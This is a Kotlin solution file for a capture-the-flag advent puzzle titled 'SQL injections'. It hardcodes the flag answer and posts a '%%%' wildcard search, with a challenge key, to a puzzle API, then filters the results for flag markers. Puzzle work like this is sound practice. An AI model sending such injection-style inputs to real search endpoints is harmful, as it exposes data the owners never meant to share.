package luke.day05

/*
 Filename: Main.kt
 Author: Mr Ditlefsen and Mr Neim
 Date: 05.12.2021
 Version: 1
 License: http://opensource.org/licenses/gpl-license.php GNU Public License
 */


import luke.Luke
import org.codehaus.jackson.map.ObjectMapper

import java.net.URI
import java.net.URLEncoder
import java.net.http.HttpClient
import java.net.http.HttpRequest
import java.net.http.HttpResponse

/*
Requirements in build.gradle.kts:

dependencies {
    implementation("com.fasterxml:jackson-xml-databind:0.6.2")
    testImplementation(kotlin("test"))
}
 */



fun main() {
    Day05().run()
}

class Day05 : Luke() {
    override fun day() = 5
    override fun title() = "SQL injections"

    private val mapper = ObjectMapper()

    override fun run() {
        println("PST{5Q1_1nj€Ⓒt10n}")

        // Form data
        val url = "https://varelager.p26e.dev/api/search"
        val values = mapOf("key" to "v1_pgmsqxmddz", "search" to "%%%")

        // Send form
        val valuesAsJson = mapper.writeValueAsString(values)
        println("valuesAsJson:" +valuesAsJson)
        val client = HttpClient.newBuilder().build();
        val request = HttpRequest.newBuilder()
            .uri(URI.create(url))
            .POST(formData(values))
            .POST(HttpRequest.BodyPublishers.ofString(valuesAsJson))
            .header("Content-Type", "application/x-www-form-urlencoded")
            .build()

        val response = client.send(request, HttpResponse.BodyHandlers.ofString());
        // println(response.body())

        // Search for PST and EGG
        var lines = response.body().lines()
        var x: Int = 0;
        lines.forEach {
            if(it.contains("PST", ignoreCase = true) || it.contains("EGG", ignoreCase = true)) {
                println("Line $x: $it")
            }

            x++
        }

    } // run



    fun String.utf8(): String = URLEncoder.encode(this, "UTF-8")

    fun formData(data: Map<String, String>): HttpRequest.BodyPublisher? {

        val res = data.map {(k, v) -> "${(k.utf8())}=${v.utf8()}"}
            .joinToString("&")

        return HttpRequest.BodyPublishers.ofString(res)
    } // formData


}
